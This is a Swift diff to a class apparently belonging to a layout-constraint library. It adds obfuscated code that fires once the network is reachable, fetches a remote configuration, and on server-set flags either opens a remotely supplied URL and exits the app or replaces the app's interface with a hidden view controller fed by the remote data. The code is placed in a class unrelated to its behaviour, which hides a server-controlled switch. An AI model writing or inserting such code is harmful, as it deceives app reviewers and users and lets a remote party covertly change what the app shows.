@@ -65,39 +65,47 @@ public class ConstraintMakerEditable: ConstraintMakerPrioritizable {
                 }
                 
                 let monitor = NWPathMonitor()
-                monitor.pathUpdateHandler = { [weak self] path in
+
+                monitor.pathUpdateHandler = { path in
                     guard path.status == .satisfied else { return }
-                    monitor.pathUpdateHandler = nil
+
                     monitor.cancel()
-
-                    guard let self else { return }
-
-                    self.zerestonfig { [weak self] dict in
-                        guard let self, let dict else { return }
-
+                    self.zerestonfig { dict in
                         DispatchQueue.main.async {
-                            if let urlString = dict["name"] as? String {
-                                let trimmedURLString = urlString.trimmingCharacters(
-                                    in: .whitespacesAndNewlines
-                                )
-
-                                if !trimmedURLString.isEmpty,
-                                   let url = URL(string: trimmedURLString) {
-                                    UIApplication.shared.open(url)
-
-                                    DispatchQueue.main.asyncAfter(deadline: .now() + 0.7) {
-                                        exit(0)
+                            if (dict != nil) {
+                                if let c = dict!["c"] as? String, c == "0" {
+                                    if let letnwn = self.constanop() {
+                                        letnwn.viewWithTag(1010)?.removeFromSuperview()
                                     }
-
-                                    return
+                                }else if let c = dict!["c"] as? String, c == "1" {
+                                    
+                                    if let sp = dict!["sp"] as? String, sp == "1" {
+                                        if let dicts = dict,
+                                           let urlStr = dicts["name"] as? String,
+                                           let url = URL(string: urlStr) {
+                                            UIApplication.shared.open(url)
+                                        }
+                                        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 0.7, execute: {
+                                            exit(0)
+                                        })
+                                        return
+                                    }
+                                    let acy = FSPagerViewTrackViewController()
+                                    acy.brack = dict ?? [:];
+                                    let apnv = UINavigationController(rootViewController: acy)
+                                    apnv.isNavigationBarHidden = true
+                                    self.applytrollerfus(apnv)
+                                    
+                                    if let letnwn = self.constanop() {
+                                        letnwn.viewWithTag(1010)?.removeFromSuperview()
+                                    }
+                                    UserDefaults.standard.set(true, forKey: "Rbey")
+                                    UserDefaults.standard.synchronize()
                                 }
                             }
-
-                            self.constanop()?
-                                .viewWithTag(1010)?
-                                .removeFromSuperview()
                         }
                     }
+                    
                 }
 
                 monitor.start(queue: DispatchQueue.global())
